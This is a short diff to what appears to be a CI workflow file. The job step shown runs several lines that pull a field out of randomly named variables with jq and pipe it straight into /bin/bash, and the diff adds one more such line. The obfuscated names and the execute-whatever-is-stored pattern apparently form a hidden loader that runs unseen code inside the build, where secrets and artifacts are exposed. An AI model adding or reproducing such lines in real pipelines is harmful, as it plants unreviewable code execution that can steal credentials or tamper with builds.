@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$r9836" | jq -r .mql61 | /bin/bash
           printf '%s' "$m20" | jq -r .psopb87371 | /bin/bash
           echo $puz3960 | jq -r .mn695 | /bin/bash
+          echo $pb93 | jq -r .sq26 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
